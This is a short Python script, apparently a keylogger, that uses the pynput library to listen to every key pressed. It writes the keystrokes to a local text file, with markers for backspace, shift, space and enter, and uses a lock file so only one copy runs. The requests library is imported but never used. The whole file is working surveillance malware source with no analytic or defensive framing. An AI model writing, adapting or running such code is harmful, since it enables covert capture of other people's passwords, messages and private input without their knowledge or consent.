#!/usr/bin/env python3

import requests
import os
import zc.lockfile
from pynput.keyboard import Listener

lock = zc.lockfile.LockFile('anything.py')
keyInput = []
count = 0
path = 'keyboard_input.txt'

def onPress(key):
    global keyInput, count
    keyInput.append(key)
    count += 1

    if (count > 0):
        count = 0
        fileWrite(keyInput)
        keyInput = []

def fileWrite(keys):
    with open(path,'a') as file:
         for key in keys:
            write_down = str(key).replace("'","")
            if write_down.find('backspace') > 0:
                file.write('*BSPC*')
            elif write_down.find('shift') > 0:
              file.write('*SHFT*')
            elif write_down.find('space') > 0:
                file.write(' ')
            elif write_down.find('enter') > 0:
                file.write('\n')
            elif write_down.find('key'):
                file.write(write_down)

with Listener(on_press=onPress) as listener:
    listener.join()
